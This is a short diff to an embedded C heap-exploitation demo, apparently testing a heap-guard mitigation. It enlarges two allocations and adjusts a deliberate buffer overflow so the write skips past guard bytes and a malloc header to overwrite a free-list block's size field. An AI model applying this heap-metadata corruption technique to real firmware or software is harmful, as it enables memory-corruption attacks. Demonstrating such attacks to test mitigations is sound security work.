@@ -9,11 +9,12 @@
 
 /* Local includes. */
 #include "console.h"
+#include "heap_guard.h"
 
 #define mainHEAP_SEND_TASK_PRIORITY       ( tskIDLE_PRIORITY + 1 )
 
-#define P1_ALLOC_SIZE   16                  /* Size of vulnerable allocation */
-#define P2_ALLOC_SIZE   16                  /* Size of attacker controlled allocation */
+#define P1_ALLOC_SIZE   64                  /* Size of vulnerable allocation */
+#define P2_ALLOC_SIZE   64                  /* Size of attacker controlled allocation */
 
 typedef struct TARGET_BLOCK_LINK
 {
@@ -103,7 +104,7 @@ static void prvHeapTask( void * pvParameters )
     console_print( "initial target value %p\n", target.pxTarget );
 
     // Write past end of p1 allocation, i.e. due to a buffer overflow
-    overflow = p1 + P1_ALLOC_SIZE;
+    overflow = p1 + P1_ALLOC_SIZE + HEAP_GUARD_SIZE*2 + sizeof(struct malloc_header);
     // Overwrite the freelist block!
     // Set a small size so this will be skipped by malloc()
     ((BlockLink_t *)overflow)->xBlockSize = 4;
